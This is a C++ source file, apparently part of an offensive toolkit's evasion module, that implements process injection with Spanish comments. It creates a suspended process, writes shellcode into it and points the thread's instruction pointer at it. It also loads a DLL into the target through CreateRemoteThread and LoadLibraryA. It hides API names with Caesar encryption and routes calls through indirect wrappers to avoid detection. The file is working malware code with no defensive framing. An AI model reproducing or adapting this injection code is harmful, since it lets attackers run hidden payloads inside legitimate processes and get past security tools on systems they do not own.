#include "evasion\ProcessHollowing.h"
#include "Obfuscator.h"

ProcessHollowing::ProcessHollowing() {}

std::string ProcessHollowing::_DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key) {
	return Obfuscator::DecryptCaesar(encryptedName, key);
}

LPVOID ProcessHollowing::_AllocateRemoteMemory(HANDLE hProcess, SIZE_T size) {
	LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteMemory == NULL) {
		std::cerr << "Error asignando memoria para la ruta del DLL en el proceso remoto: " << GetLastError() << std::endl;
		throw std::runtime_error("Error asignando memoria para la ruta del DLL en el proceso remoto");
	}

	return remoteMemory;

}

void ProcessHollowing::_WriteRemoteMemory(HANDLE hProcess, LPVOID remoteAddress, const void* buffer, SIZE_T size) {
	if (!WriteProcessMemory(hProcess, remoteAddress, buffer, size, NULL)) {
		std::cerr << "Error escribiendo la ruta del DLL en la memoria remota: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteAddress, 0, MEM_RELEASE);
		throw std::runtime_error("Error escribiendo la ruta del DLL en la memoria remota");
	}
}

void  ProcessHollowing::_ResumeProcess(PROCESS_INFORMATION& pi) {
	if (ResumeThread(pi.hThread) == -1) {
		std::cerr << "Error al reanudar el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al reanudar el proceso suspendido");
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

LPVOID ProcessHollowing::_GetLoadLibraryAddress() {
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		std::cerr << "Error obteniendo el handle de kernel32.dll: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el handle de kernel32.dll");
	}

	LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
	if (loadLibraryAddr == NULL) {
		std::cerr << "Error obteniendo la dirección de LoadLibraryA: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo la dirección de LoadLibraryA");
	}
	return loadLibraryAddr;
}

PROCESS_INFORMATION ProcessHollowing::_CreateSuspendedProcess(const std::string& targetProcess) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!api.CreateProcessA(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		std::cerr << "Error al crear el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al crear el proceso suspendido");
	}

	return pi;
}

CONTEXT ProcessHollowing::_GetProcessContext(HANDLE hThread) {
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!api.GetThreadContext(hThread, &ctx)) {
		std::cerr << "Error obteniendo el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el contexto del hilo");
	}

	return ctx;
}

PVOID ProcessHollowing::_WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode) {
	LPVOID shellcodeAddress = api.VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL) {
		std::cerr << "Error asignando memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error asignando memoria");
	}

	// Usar la llamada indirecta a WriteProcessMemory
	if (!api.WriteProcessMemory(hProcess, shellcodeAddress, shellcode.data(), shellcode.size(), NULL)) {
		std::cerr << "Error escribiendo memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error escribiendo memoria");
	}

	return shellcodeAddress;
}

VOID ProcessHollowing::_SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress) {
	ctx.Rip = (DWORD64)shellcodeAddress;

	// Usar la llamada indirecta a SetThreadContext
	if (!api.SetThreadContext(hThread, &ctx)) {
		std::cerr << "Error ajustando el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error ajustando el contexto del hilo");
	}

	// Usar la llamada indirecta a ResumeThread
	api.ResumeThread(hThread);
}

VOID ProcessHollowing::InjectShellcode(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
    try {
        // 1. Crear el proceso suspendido
        PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

        // 2. Asignar memoria para el shellcode
        LPVOID shellcodeAddress = _AllocateRemoteMemory(pi.hProcess, shellcode.size());
        _WriteRemoteMemory(pi.hProcess, shellcodeAddress, shellcode.data(), shellcode.size());

        // 3. Obtener y modificar el contexto del hilo
        CONTEXT ctx = _GetProcessContext(pi.hThread);
        ctx.Rip = (DWORD64)shellcodeAddress;

        if (!api.SetThreadContext(pi.hThread, &ctx)) {
            throw std::runtime_error("Error ajustando el contexto del hilo");
        }

        // 4. Reanudar el proceso
        _ResumeProcess(pi);

        std::cout << "Shellcode inyectado exitosamente." << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Error en InjectShellcode: " << e.what() << std::endl;
    }
}

VOID ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::string& dllPath) {
	try {
		// 1. Crear el proceso suspendido
		PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

		// 2. Asignar memoria para la ruta del DLL
		LPVOID dllPathAddress = _AllocateRemoteMemory(pi.hProcess, dllPath.size() + 1);
		_WriteRemoteMemory(pi.hProcess, dllPathAddress, dllPath.c_str(), dllPath.size() + 1);

		// 3. Obtener la dirección de LoadLibraryA
		LPVOID loadLibraryAddr = _GetLoadLibraryAddress();

		// 4. Crear un hilo remoto para ejecutar LoadLibraryA
		HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, dllPathAddress, 0, NULL);
		if (hRemoteThread == NULL) {
			throw std::runtime_error("Error creando el hilo remoto");
		}

		// 5. Esperar a que el hilo termine
		WaitForSingleObject(hRemoteThread, INFINITE);

		// 6. Limpiar recursos
		CloseHandle(hRemoteThread);
		VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);

		// 7. Reanudar el proceso
		_ResumeProcess(pi);

		std::cout << "DLL cargada exitosamente." << std::endl;
	}
	catch (const std::exception& e) {
		std::cerr << "Error en InjectDLL: " << e.what() << std::endl;
	}
}

